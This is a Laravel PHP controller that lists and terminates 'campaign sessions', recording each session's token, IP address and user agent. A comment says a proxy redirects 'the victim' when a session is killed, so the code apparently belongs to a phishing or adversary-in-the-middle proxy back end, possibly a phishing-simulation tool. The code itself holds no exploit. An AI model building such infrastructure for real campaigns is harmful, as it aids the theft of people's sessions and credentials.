<?php

namespace App\Http\Controllers;

use App\Models\CampaignSession;
use Illuminate\Http\Request;

class CampaignSessionController extends Controller
{
    /**
     * List all sessions for the given campaign.
     */
    public function index(Request $request, int $campaignId)
    {
        $campaign = $request->user()->campaigns()->findOrFail($campaignId);

        $sessions = $campaign->sessions()
            ->latest()
            ->get()
            ->map(fn ($s) => $this->format($s));

        return response()->json(['data' => $sessions]);
    }

    /**
     * Kill (terminate) a single session.
     * The proxy is expected to poll this endpoint and redirect the victim to
     * the campaign's kill_session_url when the status becomes 'killed'.
     */
    public function destroy(Request $request, int $campaignId, int $sessionId)
    {
        $campaign = $request->user()->campaigns()->findOrFail($campaignId);

        $session = $campaign->sessions()->findOrFail($sessionId);

        $session->update([
            'status'   => 'killed',
            'ended_at' => now(),
        ]);

        return response()->json([
            'data'             => $this->format($session->fresh()),
            'kill_session_url' => $campaign->kill_session_url,
        ]);
    }

    private function format(CampaignSession $s): array
    {
        return [
            'id'               => $s->id,
            'token'            => $s->token,
            'ip_address'       => $s->ip_address,
            'user_agent'       => $s->user_agent,
            'status'           => $s->status,
            'triggered_action' => $s->triggered_action,
            'triggered_at'     => optional($s->triggered_at)->format('M j, Y H:i'),
            'ended_at'         => optional($s->ended_at)->format('M j, Y H:i'),
            'created_at'       => optional($s->created_at)->format('M j, Y H:i'),
        ];
    }
}
